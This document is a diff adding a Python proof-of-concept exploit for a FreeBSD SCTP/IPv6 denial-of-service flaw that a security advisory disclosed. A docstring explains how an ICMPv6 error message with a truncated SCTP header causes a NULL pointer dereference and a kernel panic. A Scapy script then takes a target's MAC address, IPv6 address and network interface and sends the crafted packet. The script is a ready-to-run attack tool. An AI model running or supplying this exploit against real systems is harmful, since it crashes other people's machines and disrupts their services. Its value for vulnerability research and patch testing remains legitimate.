@@ -1,0 +1,44 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+
+'''
+Source: http://blog.ptsecurity.com/2016/01/severe-vulnerabilities-detected-in.html
+
+SCTP (stream control transmission protocol) is a transport-layer protocol designed to transfer signaling messages in an IP environment. As a rule, mobile operators use this protocol in technological networks.
+
+This vulnerability threatens FreeBSD systems (versions 9.3, 10.1, and 10.2) if they support SCTP and IPv6 (default configuration). To exploit this flaw, a malefactor needs to send a specially crafted ICMPv6 message. And if he succeeds, he can conduct a DoS attack.
+
+Denial of service is caused by improper check of the length of an SCTP packet header received from the ICMPv6 error message. If the target recipient is unavailable, the router can generate an error message and send it to the sender via ICMPv6.
+
+This ICMPv6 packet includes the original IPv6 packet where the Next Header field indicates how SCTP is encapsulated.
+
+When the kernel receives the error message via ICMPv6, it transfers the upper-level protocol packet to a necessary parser (sctp6_ctlinput()). The SCTP parser considers the incoming header has the required length, tries to copy it using m_copydata(), which has offset values and the number of bytes. Since a twelve-byte chunk is expected, if the attacker sends a packet with an eleven-byte header, a NULL pointer is dereferenced causing kernel panic.
+
+There is no need for an open SCTP socket to successfully exploit this vulnerability. Scapy can help to create an ICMPv6 packet.
+'''
+ 
+import argparse
+from scapy.all import *
+ 
+ 
+def get_args():
+    parser = argparse.ArgumentParser(description='#' * 78, epilog='#' * 78)
+    parser.add_argument("-m", "--dst_mac", type=str, help="FreeBSD mac address")
+    parser.add_argument("-i", "--dst_ipv6", type=str, help="FreeBSD IPv6 address")
+    parser.add_argument("-I", "--iface", type=str, help="Iface")
+    options = parser.parse_args()
+ 
+    if options.dst_mac is None or options.dst_ipv6 is None:
+        parser.print_help()
+        exit()
+ 
+    return options
+ 
+ 
+if __name__ == '__main__':
+    options = get_args()
+ 
+    sendp(Ether(dst=options.dst_mac) / IPv6(dst=options.dst_ipv6) / ICMPv6DestUnreach() / IPv6(nh=132,
+                                                                                               src=options.dst_ipv6,
+                                                                                               dst='fe80::230:56ff:fea6:648c'),
+          iface=options.iface)
